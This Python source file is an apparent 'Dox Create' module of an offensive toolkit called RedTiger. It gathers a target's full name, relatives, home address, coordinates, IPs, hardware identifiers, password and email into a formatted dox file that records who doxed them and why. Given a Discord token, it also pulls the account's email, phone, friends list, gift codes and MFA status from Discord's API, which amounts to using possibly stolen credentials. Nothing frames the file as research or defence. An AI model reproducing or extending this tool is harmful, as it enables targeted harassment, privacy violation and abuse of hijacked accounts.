# Copyright (c) RedTiger 
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import random
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
except Exception as e:
   ErrorModule(e)
   

Title("Dox Create")

try:
    def NumberInfo(phone_number):
        try:
            parsed_number = phonenumbers.parse(phone_number, None)
            operator_phone = carrier.name_for_number(parsed_number, "fr")
            type_number_phone = "Mobile" if phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE else "Fixe"
            country_phone = phonenumbers.region_code_for_number(parsed_number)
            region_phone = geocoder.description_for_number(parsed_number, "fr")
            timezones = timezone.time_zones_for_number(parsed_number)
            timezone_phone = timezones[0] if timezones else None
        except:
            operator_phone = "None"
            type_number_phone = "None"
            country_phone = "None"
            region_phone = "None"
            timezone_phone = "None"

        return operator_phone, type_number_phone, country_phone, region_phone, timezone_phone

    def IpInfo(ip):
        try:
            response = requests.get(f"https://{website}/api/ip/ip={ip}")
            api = response.json()
        except:
            pass

        try:
            isp_ip = api["isp"]
        except:
            isp_ip = "None"
        
        try:
            org_ip = api["org"]
        except:
            org_ip = "None"

        try:
            as_ip = api["as"]
        except:
            as_ip = "None"
        
        return isp_ip, org_ip, as_ip

    def TokenInfo(token):
        try:
            from datetime import datetime, timezone
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        except:
            pass

        try:
            username_discord = user['username'] + '#' + user['discriminator']
        except:
            username_discord = "None"
        
        try:
            display_name_discord = user['global_name']
        except:
            display_name_discord = "None"

        try:
            user_id_discord = user['id']
        except:
            user_id_discord = "None"

        try:
            avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.png"
        except:
            avatar_url_discord = "None"

        try:
            created_at_discord = datetime.fromtimestamp(((int(user['id']) >> 22) + 1420070400000) / 1000, timezone.utc)
        except:
            created_at_discord = "None"

        try:
            email_discord = user['email']
        except:
            email_discord = "None"

        try:
            phone_discord = user['phone']
        except:
            phone_discord = "None"

        try:
            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
            if friends:
                friends_discord = []
                for friend in friends:
                    unprefered_flags = [64, 128, 256, 1048704]
                    data = f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})"

                    if len('\n'.join(friends_discord)) + len(data) >= 1024:
                        break

                    friends_discord.append(data)

                if len(friends_discord) > 0:
                    friends_discord = '\n' + ' / '.join(friends_discord)
                else:
                    friends_discord = "None"
            else:
                friends_discord = "None"
        except:
            friends_discord = "None"

        try:
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
            if gift_codes:
                codes = []
                for gift_codes_discord in gift_codes:
                    name = gift_codes_discord['promotion']['outbound_title']
                    gift_codes_discord = gift_codes_discord['code']
                    data = f"Gift: {name}\nCode: {gift_codes_discord}"
                    if len('\n\n'.join(gift_codes_discord)) + len(data) >= 1024:
                        break
                    gift_codes_discord.append(data)
                if len(gift_codes_discord) > 0:
                    gift_codes_discord = '\n\n'.join(gift_codes_discord)
                else:
                    gift_codes_discord = "None"
            else:
                gift_codes_discord = "None"
        except:
            gift_codes_discord = "None"

        try:
            mfa_discord = user['mfa_enabled']
        except:
            mfa_discord = "None"

        try:
            if user['premium_type'] == 0:
                nitro_discord = 'False'
            elif user['premium_type'] == 1:
                nitro_discord = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro_discord = 'Nitro Boosts'
            elif user['premium_type'] == 3:
                nitro_discord = 'Nitro Basic'
            else:
                nitro_discord = 'False'
        except:
            nitro_discord = "None"

        return username_discord, display_name_discord, user_id_discord, avatar_url_discord, created_at_discord, email_discord, phone_discord, nitro_discord, friends_discord, gift_codes_discord, mfa_discord


    Slow(dox_banner+"\n")

    by =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Doxed By      : {reset}")
    reason =  input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Reason        : {reset}")
    pseudo1 = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} First Pseudo  : {reset}")
    pseudo2 = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Second Pseudo : {reset}")

    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Discord Information:")
    token_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Token ? (y/n) -> {reset}")
    if token_input in ["y", "Y", "yes", "YES", "Yes"]:
        token = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Token: {reset}")
        username_discord, display_name_discord, user_id_discord, avatar_url_discord, created_at_discord, email_discord, phone_discord, nitro_discord, friends_discord, gift_codes_discord, mfa_discord = TokenInfo(token)
    else:
        token = "None"
        username_discord =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Username      : {reset}")
        display_name_discord = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Display Name  : {reset}")
        user_id_discord =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Id            : {reset}")
        avatar_url_discord =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Avatar        : {reset}")
        created_at_discord =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Created At    : {reset}")
        email_discord =        input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Email         : {reset}")
        phone_discord =        input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Phone         : {reset}")
        nitro_discord =        input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Nitro         : {reset}")
        friends_discord =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Friends       : {reset}")
        gift_codes_discord =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Gift Code     : {reset}")
        mfa_discord =          input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Mfa           : {reset}")

    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Ip Information:")
    ip_public = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Ip Publique   : {reset}")
    ip_local =  input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Ip Local      : {reset}")
    ipv6 =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Ipv6          : {reset}")
    vpn_pc =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} VPN           : {reset}")
    isp_ip, org_ip, as_ip = IpInfo(ip_public)

    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Pc Information:")
    name_pc =         input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Name          : {reset}")
    username_pcc =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Username      : {reset}")
    displayname_pc =  input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Display Name  : {reset}")
    platform_pc =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Platefrom     : {reset}")
    exploitation_pc = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Exploitation  : {reset}")
    windowskey_pc =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Windows Key   : {reset}")
    mac_pc =          input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} MAC Adress    : {reset}")
    hwid_pc =         input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} HWID Adress   : {reset}")
    cpu_pc =          input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} CPU           : {reset}")
    gpu_pc =          input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} GPU           : {reset}")
    ram_pc =          input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} RAM           : {reset}")
    disk_pc =         input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Disk          : {reset}")
    mainscreen_pc =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Screen Main   : {reset}")
    secscreen_pc =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Screen Sec    : {reset}")
                    
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Number Information:")
    phone_number = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Phone Number  : {reset}")
    brand_phone = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Brand         : {reset}")
    operator_phone, type_number_phone, country_phone, region_phone, timezone_phone = NumberInfo(phone_number)

    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Personal Information:")
    gender =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Gender        : {reset}")
    last_name =  input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Last Name     : {reset}")
    first_name = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} First Name    : {reset}")
    age =        input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Age           : {reset}")
    mother =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Mother        : {reset}")
    father =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Father        : {reset}")
    brother =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Brother       : {reset}")
    sister =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Sister        : {reset}")
                
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Loc Information:")
    continent =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Continent     : {reset}")
    country =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Country       : {reset}")
    region =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Region        : {reset}")
    postal_code = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Postal Code   : {reset}")
    city =        input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} City          : {reset}")
    adress =      input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Adress        : {reset}")
    timezone =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Timezone      : {reset}")
    longitude =   input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Longitude     : {reset}")
    latitude =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Latitude      : {reset}")

    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Social Information:")
    password = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Password      : {reset}")
    email =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Email         : {reset}")
            
    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO}{yellow} Other:")
    other =    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Other         : {reset}")
    database = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} DataBase      : {reset}")
    logs =     input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Logs          : {reset}")


    name_file = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Choose the file name -> {reset}")
    if not name_file.strip():
        name_file = f'No Name {random.randint(1, 999)}'

    dox_path_relative = f"\\1-Output\\DoxCreate\\D0x - {name_file}.txt"
    dox_path = os.path.join(tool_path, "1-Output", "DoxCreate", f"D0x - {name_file}.txt")

    with open(dox_path, 'w', encoding='utf-8') as file:
        file.write(f'''
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                    
                                        
            ██████╗   ██████╗  ██╗  ██╗
            ██╔══██╗ ██╔═══██╗ ╚██╗██╔╝
            ██║  ██║ ██║   ██║  ╚███╔╝ 
            ██║  ██║ ██║   ██║  ██╔██╗ 
            ██████╔╝ ╚██████╔╝ ██╔╝ ██╗ 
            ╚═════╝   ╚═════╝  ╚═╝  ╚═╝   Template By RedTiger (https://{github_tool})
                                        
                                                                                   
            Doxed By : {by}
            Reason   : {reason}
            Pseudo   : "{pseudo1}", "{pseudo2}"
    
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

           ╔═══════════════════════════════════════════════════════════════════════════════════════╗
            DISCORD:
            =====================================================================================
            [+] Username     : {username_discord}
            [+] Display Name : {display_name_discord}
            [+] ID           : {user_id_discord}
            [+] Avatar       : {avatar_url_discord}
            [+] Created At   : {created_at_discord}
            [+] Token        : {token}
            [+] E-Mail       : {email_discord}
            [+] Phone        : {phone_discord}
            [+] Nitro        : {nitro_discord}
            [+] Friends      : {friends_discord}
            [+] Gift Code    : {gift_codes_discord}
            [+] Multi-Factor Authentication : {mfa_discord}
           ╚═══════════════════════════════════════════════════════════════════════════════════════╝

           ╔═══════════════════════════════════════════════════════════════════════════════════════╗
            INFORMATION:
            =====================================================================================
            +────────────Pc────────────+
            [+] IP Publique  : {ip_public}
            [+] Ip Local     : {ip_local}
            [+] Ipv6         : {ipv6}
            [+] Isp          : {isp_ip}
            [+] Org          : {org_ip}
            [+] As           : {as_ip}

            [+] VPN Y/N      : {vpn_pc}

            [+] Name         : {name_pc}
            [+] Username     : {username_pcc}
            [+] Display Name : {displayname_pc}

            [+] Plateform    : {platform_pc}
            [+] Exploitation : {exploitation_pc}
            [+] Windows Key  : {windowskey_pc}

            [+] MAC          : {mac_pc}
            [+] HWID         : {hwid_pc}
            [+] CPU          : {cpu_pc}
            [+] GPU          : {gpu_pc}
            [+] RAM          : {ram_pc}
            [+] Disk         : {disk_pc}

            [+] Screen Main      : {mainscreen_pc}
            [+] Screen Secondary : {secscreen_pc}

            +───────────Phone──────────+
            [+] Phone Number : {phone_number}
            [+] Brand        : {brand_phone}
            [+] Operator     : {operator_phone}
            [+] Type Number  : {type_number_phone}
            [+] Country      : {country_phone}
            [+] Region       : {region_phone}
            [+] Timezone     : {timezone_phone}

            +───────────Personal───────+
            [+] Gender      : {gender}
            [+] Last Name   : {last_name}
            [+] First Name  : {first_name}
            [+] Age         :  {age}

            [+] Mother      : {mother}
            [+] Father      : {father}
            [+] Brother     : {brother}
            [+] Sister      : {sister}

            +────────────Loc───────────+
            [+] Continent   : {continent}
            [+] Country     : {country}
            [+] Region      : {region}
            [+] Postal Code : {postal_code}
            [+] City        : {city}
            [+] Address     : {adress}
            [+] Timezone    : {timezone}
            [+] Longitude   : {longitude}
            [+] Latitude    : {latitude}
           ╚═══════════════════════════════════════════════════════════════════════════════════════╝


           ╔═══════════════════════════════════════════════════════════════════════════════════════╗
            SOCIAL:
            =====================================================================================
            +──────Mails & Password─────+
            [+] Email    : {email}
            [+] Password : {password}
           ╚═══════════════════════════════════════════════════════════════════════════════════════╝

           ╔═══════════════════════════════════════════════════════════════════════════════════════╗
            OTHER:
            =====================================================================================
            {other}
           ╚═══════════════════════════════════════════════════════════════════════════════════════╝

           ╔═══════════════════════════════════════════════════════════════════════════════════════╗
            DATABASE:
            =====================================================================================
            {database}
           ╚═══════════════════════════════════════════════════════════════════════════════════════╝

           ╔═══════════════════════════════════════════════════════════════════════════════════════╗
            LOGS:
            =====================================================================================
            {logs}
           ╚═══════════════════════════════════════════════════════════════════════════════════════╝
    ''')

    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} The DOX {white}\"{name_file}\"{red} was sent to: {white}\"{dox_path_relative}\"")
    Continue()
    Reset()
except Exception as e:
    Error(e)